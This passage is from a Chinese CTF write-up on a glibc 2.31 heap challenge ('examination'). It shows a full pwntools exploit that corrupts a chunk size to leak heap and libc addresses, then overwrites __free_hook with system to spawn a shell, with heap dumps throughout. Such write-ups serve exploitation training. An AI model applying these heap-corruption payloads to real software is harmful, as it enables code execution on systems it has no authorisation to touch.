<li>calloc 不会从 tcachebin 里取空闲的 chunk，tcache attack失效</li>
<li>calloc 会将申请到的堆块内容清 0，overlapping 可能也够呛了</li>
</ul>
<p>我当时的思路就是：直接覆盖“chunk-&gt;size”的低位，把它释放入unsortedbin，后续 leak libc_base（一次“任意++”可能不太行，需要两次）</p>
<p>这里最大的问题就是：如何利用堆风水，使修改了“size”的chunk在释放时不会报错，当时做题的时候就是卡在这里了，想了多种组合方式都没有成功……</p>
<p>比赛结束后，看了下 free 的源码，才发现是 unlink 的检查没有通过：（经此一役，打算做个free的源码分析）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>先看看官方wp的处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">role(<span class="number">0</span>)</span><br><span class="line">add_st(<span class="number">1</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_st(<span class="number">1</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give() <span class="comment"># 现在拥有了两次check的机会</span></span><br><span class="line"></span><br><span class="line">add_st(<span class="number">2</span>)</span><br><span class="line">comment(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">&#x27;222&#x27;</span>)</span><br><span class="line">add_st(<span class="number">3</span>)</span><br><span class="line">add_st(<span class="number">4</span>)</span><br><span class="line">comment(<span class="number">4</span>,<span class="number">0x3ff</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x248</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)) <span class="comment"># 这里的操作就是关键</span></span><br><span class="line">add_st(<span class="number">5</span>)</span><br><span class="line">add_st(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">heap_base = leak_addr-<span class="number">16</span>-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">target_addr=heap_base+<span class="number">0x2e0</span> <span class="comment"># 第1次&quot;++&quot;</span></span><br><span class="line">success(<span class="string">&#x27;target_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(target_addr))</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">check()</span><br><span class="line">target_addr=heap_base+<span class="number">0x2e0</span> <span class="comment"># 第2次&quot;++&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(target_addr))</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">comment_have(<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x48</span>+p16(<span class="number">0x421</span>)) <span class="comment"># 攻击comment0,覆盖student1-&gt;size</span></span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>修改前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b42e0</span> <span class="comment">// comment0</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4330</span> <span class="comment">// student1(target)</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4360</span> <span class="comment">// chunk1</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4380</span> <span class="comment">// comment1</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b43d0</span> <span class="comment">// student2</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4400</span> <span class="comment">// chunk2</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4420</span> <span class="comment">// comment2</span></span><br><span class="line">Size: <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55fd4c4b4500</span> <span class="comment">// comment4</span></span><br><span class="line">Size: <span class="number">0x411</span></span><br></pre></td></tr></table></figure>
<p>修改后，释放前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555c7a4be2e0</span> <span class="comment">// comment0</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555c7a4be330</span> <span class="comment">// student1(target)</span></span><br><span class="line">Size: <span class="number">0x421</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555c7a4be750</span> <span class="comment">// fake_chunk1</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555c7a4be770</span> <span class="comment">// fake_chunk2</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x555c7a4be790</span></span><br><span class="line">Size: <span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<p>释放后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x562a85b602e0</span> <span class="comment">// comment0</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x562a85b60330 <span class="comment">// student1(target)</span></span></span><br><span class="line"><span class="function">Size: 0x421</span></span><br><span class="line"><span class="function">fd: 0x7f3d7b952be0</span></span><br><span class="line"><span class="function">bk: 0x7f3d7b952be0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x562a85b60750 <span class="comment">// fake_chunk1</span></span></span><br><span class="line"><span class="function">Size: 0x20</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x562a85b60770 <span class="comment">// fake_chunk2</span></span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x562a85b60790</span></span><br><span class="line"><span class="function">Size: 0x00</span></span><br></pre></td></tr></table></figure>
<p>发现“student1”已经成功进入了 unsortedbin，并且后续区域都可以被该 unsorted chunk 控制，借此我们可以“还原”被破坏的内容，并且把“main_arena+xx”覆盖到我们想要的位置</p>
<p>比如说：覆盖到“comment2”后，直接利用“check”打印出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x410</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">2</span>)+p64(heap_base+<span class="number">0x430</span>)+p64(<span class="number">0x10</span>)</span><br><span class="line">comment(<span class="number">6</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">2</span>)</span><br><span class="line">check()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">2018272</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来就可以覆盖“student3-&gt;comment3”为“free_hook-8”，最后将其修改为“system”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x4a0</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(free_hook-<span class="number">8</span>)+p64(<span class="number">0x10</span>)</span><br><span class="line">comment(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">comment_have(<span class="number">3</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>+p64(system_libc))</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55af7721a330</span> <span class="comment">// student1</span></span><br><span class="line">Size: <span class="number">0xf1</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55af7721a420</span> <span class="comment">// comment2,student3</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55af7721a4b0</span></span><br><span class="line"><span class="function">Size: 0x2a1</span></span><br><span class="line"><span class="function">fd: 0x7f70a91b4be0</span></span><br><span class="line"><span class="function">bk: 0x7f70a91b4be0</span></span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">role</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	role(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_st</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;enter the number of questions:&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span>(<span class="params"><span class="built_in">id</span>,size,comment</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which one? &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;please input the size of comment: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;enter your comment:\n&#x27;</span>,comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment_have</span>(<span class="params"><span class="built_in">id</span>,comment</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which one? &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;enter your comment:\n&#x27;</span>,comment)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;to choose?\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">data</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">	p.sendline(data)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mode</span>(<span class="params">score</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))	</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;enter your pray score: 0 to 100\n&#x27;</span>,<span class="built_in">str</span>(score))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">6</span>))	</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;input your id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">role(<span class="number">0</span>)</span><br><span class="line">add_st(<span class="number">1</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_st(<span class="number">1</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give()</span><br><span class="line"></span><br><span class="line">add_st(<span class="number">2</span>)</span><br><span class="line">comment(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">&#x27;222&#x27;</span>)</span><br><span class="line">add_st(<span class="number">3</span>)</span><br><span class="line">add_st(<span class="number">4</span>)</span><br><span class="line">comment(<span class="number">4</span>,<span class="number">0x3ff</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x248</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">add_st(<span class="number">5</span>)</span><br><span class="line">add_st(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">heap_base = leak_addr-<span class="number">16</span>-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">target_addr=heap_base+<span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&#x27;target_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(target_addr))</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">check()</span><br><span class="line">target_addr=heap_base+<span class="number">0x2e0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(target_addr))</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">comment_have(<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x48</span>+p16(<span class="number">0x421</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x410</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">2</span>)+p64(heap_base+<span class="number">0x430</span>)+p64(<span class="number">0x10</span>)</span><br><span class="line">comment(<span class="number">6</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">2</span>)</span><br><span class="line">check()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">2018272</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;system_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x4a0</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(free_hook-<span class="number">8</span>)+p64(<span class="number">0x10</span>)</span><br><span class="line">comment(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">comment_have(<span class="number">3</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>+p64(system_libc))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>复现完这个题目后，感觉打比赛时的自己挺蠢的</p>
<ul>
<li>上午因为把结构体改错了，导致负数溢出这个漏洞迟迟出不了</li>
<li>下午我误以为“任意++”这个条件只能执行一次，导致做了好几个小时的无用功</li>
